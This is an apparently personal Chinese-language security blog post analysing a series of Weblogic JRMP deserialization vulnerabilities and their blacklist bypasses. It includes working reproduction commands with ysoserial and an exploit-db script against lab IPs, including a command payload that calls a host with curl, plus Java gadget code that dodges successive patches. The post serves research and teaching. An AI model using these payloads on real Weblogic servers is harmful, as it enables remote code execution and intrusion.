---
title: "Weblogic JRMP反序列化及绕过分析"
date: 2020-02-26T20:30:20+08:00
draft: false
tags:
- Weblogic
- CVE
- Java
- 反序列化
series:
- Weblogic
categories:
- 代码审计
---

Weblogic JRMP反序列化的一系列漏洞及绕过分析.
<!--more-->
## 前言
JRMP是Java使用的另一种数据传输协议，在前文中提到了传输过程中会自动序列化和反序列化，因此weblogic出现了一系列的漏洞，即CVE-2017-3248、CVE-2018-2628、CVE-2018-2893、CVE-2018-3245，众所周知weblogic打补丁的形式为黑名单，所以CVE-2017-3248之后的洞都为黑名单绕过，本文逐一讲解。

## CVE-2017-3248
### 复现
因为本机没有python2，就直接在虚拟机里复现了。使用ysoserial监听JRMP服务
```
./Oracle/Middleware/jdk160_29/jre/bin/java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8080 CommonsCollections1 'touch /tmp/success'
```
[下载python版exp脚本](https://www.exploit-db.com/exploits/44553) ，运行
```
python 44553.py 172.16.2.129 7001 ./ysoserial.jar 172.16.2.129 8080 JRMPClient
```
成功创建/tmp/success文件
![image](https://y4er.com/img/uploads/20200226205381.png)

### 分析

JRMP在前文中提到了在传输过程中也会自动序列化和反序列化，那么我们可以构造一个gadgets，通过T3协议让weblogic自动请求我们的JRMPListener，然后JRMPListener返回给他一个恶意的gadgets对象，weblogic自动反序列化恶意对象，达到rce。

过程如图
![image](https://y4er.com/img/uploads/20200226201443.png)

整个构造需要两步
1. 构造T3协议的payload，让weblogic请求我们的JRMP -> 复现中的python脚本
2. 构造JRMPListener返回的gadgets                                -> 复现时监听JRMPListener

看下python脚本，发现脚本中是使用ysoserial生成payload.out，然后读出hex构造t3发包
![image](https://y4er.com/img/uploads/20200226206003.png)

看下JRMPClient.java的代码
![image](https://y4er.com/img/uploads/20200226200969.png)

利用java.rmi.registry.Registry，序列化RemoteObjectInvocationHandler，并使用UnicastRef和远端建立tcp连接，获取RMI registry，序列化之后发送给weblogic，weblogic会请求我们的JRMPListener，然后将获取的内容利用readObject()进行解析，导致恶意代码执行。

### 改造weblogic_cmd
BypassPayloadSelector.java
```java
public static Object selectBypass(Object payload) throws Exception {

    if (Main.TYPE.equalsIgnoreCase("marshall")) {
        payload = marshalledObject(payload);
    } else if (Main.TYPE.equalsIgnoreCase("streamMessageImpl")) {
        payload = streamMessageImpl(Serializables.serialize(payload));
    }else if(Main.TYPE.equalsIgnoreCase("JRMPListener")){
        payload = JRMPListener(cmdLine.getOptionValue("H")+":"+ cmdLine.getOptionValue("P"));
    }
    return payload;
}

public static Registry JRMPListener(String command) throws Exception {

    String host;
    int port;
    int sep = command.indexOf(':');
    if (sep < 0) {
        port = new Random().nextInt(65535);
        host = command;
    } else {
        host = command.substring(0, sep);
        port = Integer.valueOf(command.substring(sep + 1));
    }
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te = new TCPEndpoint(host, port);
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
    Registry proxy = (Registry) Proxy.newProxyInstance(BypassPayloadSelector.class.getClassLoader(), new Class[]{
        Registry.class
            }, obj);
    return proxy;
}
```
weblogic_cmd是一个很方便发送t3协议数据的工具，改了改通过参数-T来指定JRMPClient，加了一个JRMPClient方法，仍然需要用ysoserial.jar监听JRMPListener。
```
java -cp yso.jar ysoserial.exploit.JRMPListener 8080 CommonsCollections1 "curl http://172.16.1.1"
```

## CVE-2018-2628
先看CVE-2017-3248的补丁
```java
protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
    String[] arr$ = interfaces;
    int len$ = interfaces.length;

    for(int i$ = 0; i$ < len$; ++i$) {
        String intf = arr$[i$];
        if (intf.equals("java.rmi.registry.Registry")) {
            throw new InvalidObjectException("Unauthorized proxy deserialization");
        }
    }

    return super.resolveProxyClass(interfaces);
}
```
思路一：resolveProxyClass反序列化代理类才会调用，直接反序列化UnicastRef对象，调用sum.rmi.server.UnicastRef#readExternal。
```java
public Registry getObject(final String command) throws Exception {

    String host;
    int port;
    int sep = command.indexOf(':');
    if (sep < 0) {
        port = new Random().nextInt(65535);
        host = command;
    } else {
        host = command.substring(0, sep);
        port = Integer.valueOf(command.substring(sep + 1));
    }
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te = new TCPEndpoint(host, port);
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    return ref;
}
```
这样绕过之后补丁把UnicastRef加入了黑名单。

思路二：使用java.rmi.registry.Registry之外的类。廖新喜用的`java.rmi.activation.Activator`
```java
public Registry getObject(final String command) throws Exception {
    String host;
    int port;
    int sep = command.indexOf(':');
    if (sep < 0) {
        port = new Random().nextInt(65535);
        host = command;
    } else {
        host = command.substring(0, sep);
        port = Integer.valueOf(command.substring(sep + 1));
    }
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te = new TCPEndpoint(host, port);
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
    Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient3.class.getClassLoader(), new Class[] {
        Activator.class
            }, obj);
    return proxy;
}
```
## CVE-2018-2893
由于weblogic一直没有处理streamMessageImpl，导致CVE-2016-0638 + CVE-2018-2628 = CVE-2018-2893，用streamMessageImpl封装一下而已。

## CVE-2018-3245
RMIConnectionImpl_Stub代替RemoteObjectInvocationHandler，实际上就是找RemoteObject类的子类。https://github.com/pyn3rd/CVE-2018-3245

## 总结
一切罪恶的源头都是T3协议，weblogic还是禁用T3协议为好。weblogic黑名单补丁总是治标不治本，无奈的是补丁需要付费才能下载到。

## 参考
1. https://www.cnblogs.com/afanti/p/10256840.html
2. https://seaii-blog.com/index.php/2019/12/29/92.html
3. https://github.com/pyn3rd/CVE-2018-2893
4. https://mp.weixin.qq.com/s/ohga7Husc9ke5UYuqR92og
5. [廖新喜 CVE-2018-2628 简单复现与分析](http://xxlegend.com/2018/06/20/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/)

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**